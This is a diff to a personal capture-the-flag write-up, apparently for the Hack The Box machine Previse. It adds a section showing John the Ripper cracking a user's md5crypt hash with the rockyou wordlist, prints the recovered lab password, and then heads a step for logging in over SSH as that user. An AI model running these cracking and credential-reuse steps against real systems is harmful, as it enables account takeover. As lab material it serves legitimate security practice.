@@ -87,4 +87,24 @@ select * from accounts;
 mysql>
 ```
 ![[Pasted image 20210918115839.png]]
-## Cracking hash to get m4lwhere user password
+## Cracking hash using `johntheripper` to get m4lwhere user password
+```bash
+~/Dropbox/Documents/htb/boxes/previse ❯ john --format=md5crypt-long hash.hash --wordlist=/home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:02:05 23.46% (ETA: 12:11:01) 0g/s 28432p/s 28432c/s 28432C/s stalonh..stallout54
+0g 0:00:03:25 39.45% (ETA: 12:10:48) 0g/s 28192p/s 28192c/s 28192C/s marikarmen22_**..marika5601
+ilovecody112235! (?)
+1g 0:00:04:23 DONE (2021-09-18 12:06) 0.003801g/s 28181p/s 28181c/s 28181C/s ilovecodydean..ilovecody..
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+~/Dropbox/Documents/htb/boxes/previse 4m 23s ❯ john --show hash.hash
+?:ilovecody112235!
+
+1 password hash cracked, 0 left
+```
+![[Pasted image 20210918120857.png]]
+## SSH logging in as m4lwhere user
+![[Pasted image 20210918121051.png]]
